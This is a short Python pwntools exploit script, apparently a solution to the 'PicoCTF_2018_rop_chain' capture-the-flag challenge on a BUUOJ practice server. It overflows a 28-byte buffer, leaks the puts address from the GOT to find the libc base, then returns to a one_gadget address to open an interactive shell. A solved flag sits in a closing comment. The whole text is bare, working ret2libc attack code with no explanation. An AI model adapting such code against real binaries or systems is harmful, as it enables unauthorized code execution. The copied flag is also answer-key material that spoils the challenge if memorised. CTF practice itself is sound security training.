from pwn import *
from LibcSearcher import *
p = remote('node4.buuoj.cn',28628)
libc = ELF("libc-2.27.so")
context.log_level="debug"
elf=ELF("PicoCTF_2018_rop_chain")
puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]
main_addr=elf.sym["main"]
payload=(28)*b'a'+p32(puts_plt)+p32(main_addr)+p32(puts_got)
p.sendlineafter(">",payload)
puts_addr = u32(p.recvuntil('\xf7')[-4:])

libc_base=puts_addr-libc.sym['puts']
one_addr=0x3cbea+libc_base
payload_=28*b'a'+p32(one_addr)+p32(main_addr)+p32(0)*0x34
p.sendlineafter(">",payload_)
p.interactive()
#flag{290a2df7-b299-4f0a-8eeb-2553e3523659}